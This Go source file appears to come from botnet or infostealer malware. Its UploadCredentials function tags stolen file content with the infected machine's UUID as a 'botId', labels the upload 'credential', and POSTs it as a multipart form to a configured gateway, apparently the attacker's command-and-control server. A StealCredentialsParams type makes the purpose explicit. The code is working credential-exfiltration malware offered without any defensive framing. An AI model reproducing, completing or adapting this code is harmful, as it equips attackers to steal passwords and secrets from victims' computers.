package main

import (
	"bytes"
	"io"
	"log"
	"mime/multipart"
	"net/http"
)

type StealCredentialsParams struct {
}

func UploadCredentials(fileContent []byte, filePath string) {
	config := loadConfig(true)

	url := config.Gateway + "/"

	uuid, err := GetMachineUUID()

	var buf bytes.Buffer

	// Create a new multipart writer with the buffer
	w := multipart.NewWriter(&buf)

	_ = w.WriteField("botId", uuid)
	_ = w.WriteField("uploadType", "credential")

	// Create a new form field
	fw, err := w.CreateFormFile("file", filePath)
	if err != nil {
		log.Fatal(err)
	}

	// Copy the contents of the file to the form field
	if _, err := io.Copy(fw, bytes.NewReader(fileContent)); err != nil {
		log.Fatal(err)
	}

	// Close the multipart writer to finalize the request
	w.Close()

	// Send the request
	req, err := http.NewRequest("POST", url, &buf)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

}
